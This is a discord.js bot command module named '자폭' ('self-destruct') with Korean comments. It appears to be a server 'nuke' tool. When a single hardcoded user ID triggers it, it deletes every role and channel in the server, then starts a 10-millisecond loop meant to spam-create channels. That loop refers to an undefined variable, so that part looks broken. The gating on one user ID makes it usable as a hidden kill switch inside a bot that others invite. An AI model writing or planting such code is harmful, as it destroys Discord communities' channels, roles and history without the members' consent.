module.exports = {
    name: "자폭",
    execute(message, args) {
        var { PermissionsBitField } = require('discord.js');
        // message.channel.send(`자폭 시스템을 가동합니다.`);

        // 사용자 확인
        if (message.member.id != '1111901206030336031') return;

        //역할 삭제
        message.guild.roles.cache.forEach(role => {
            try {
                role.delete()
                    .then(deletedRole => {
                        console.log(`역할 ${deletedRole.name}을(를) 삭제했습니다.`);
                    })
                    .catch(error => {
                        console.log('역할 삭제 중 오류 발생:', error);
                    });
            } catch (error) {
                console.log('역할 삭제 중 오류 발생:', error);
            }
        })

        // 채널 삭제
        message.guild.channels.cache.forEach(channel => {
            channel.delete()
                .then(deletedChannel => console.log(`'${deletedChannel.name}' 채널을 삭제했어요.`))
               .catch(error => console.log(`'${channel.name}' 채널 삭제에 실패했어요. 오류 코드 :` + error));
      });

        // 일정한 시간 간격으로 작업을 반복하는 함수
        if (typeof args.join(" ") !== 'undefined') {
            const intervalId = setInterval(() => {
                var channelName = args.join(" ");
                try {
                    // message.guild.channels.create(
                    //     {
                    //         name: channelName,
                    //         type: 0
                    //     }
                    // )
                    guild.channels.create(
                        {
                            name: args[1],
                            type: 0
                        }
                    )
                } catch (error) {
                    // message.member.send(msg);
                }
            }
                , 10);
        }
    }
}